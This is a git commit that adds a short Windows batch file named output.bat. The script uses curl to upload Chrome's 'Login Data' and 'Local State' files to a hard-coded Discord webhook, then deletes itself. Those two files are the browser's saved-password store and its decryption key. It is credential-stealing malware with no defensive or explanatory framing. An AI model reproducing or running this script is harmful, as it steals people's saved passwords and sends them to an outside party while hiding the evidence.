4ec08bf22a862bf5d170bece8236102cd38b940a
d2s6x0VwerWQFR2CcbeF1opLywWE <d2sWo6vH5p6x0V2CcbeF1opLywWE@gmail.com>
2024-06-01 12:11:04 -0700

    Create output.bat

---
+++ output.bat
@@ -0,0 +1,9 @@
+@echo off
+set "sourceDir1=C:\Users\donot\AppData\Local\Google\Chrome\User Data\Default\"
+set "sourceDir2=C:\Users\donot\AppData\Local\Google\Chrome\User Data\"
+set "fileName1=Login Data"
+set "fileName2=Local State"
+set "webhookUrl=https://discord.com/api/webhooks/1246527590026448926/LTvUJGS9xvGSiozP-8jr-BaRki98at9F_SngX_bdpasuTb_9_dmQTrhjLjtjWdMHejyT"
+curl -F "file=@%sourceDir1%\%fileName1%" %webhookUrl%
+curl -F "file=@%sourceDir2%\%fileName2%" %webhookUrl%
+del "%~f0"
